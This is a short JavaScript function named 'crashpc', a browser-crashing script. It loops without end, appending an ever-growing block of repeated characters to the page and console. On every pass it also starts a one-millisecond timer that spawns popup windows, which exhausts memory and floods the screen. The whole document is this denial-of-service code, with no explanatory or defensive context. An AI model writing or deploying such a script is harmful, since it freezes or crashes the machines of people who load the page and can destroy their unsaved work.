function crashpc() {
 let txt = "";

  for(var i = 0; i === i; i++) {
     txt = txt + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰".repeat(99);
  
     var x = document.createElement("div");
     x.innerText = txt;
  
    document.body.appendChild(x);
    console.log(txt);
    
    setInterval(function () {
      open('https://example.invalid', Math.random().toString(), "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=300,left=100,top=100");
    }, 1);
  };
};
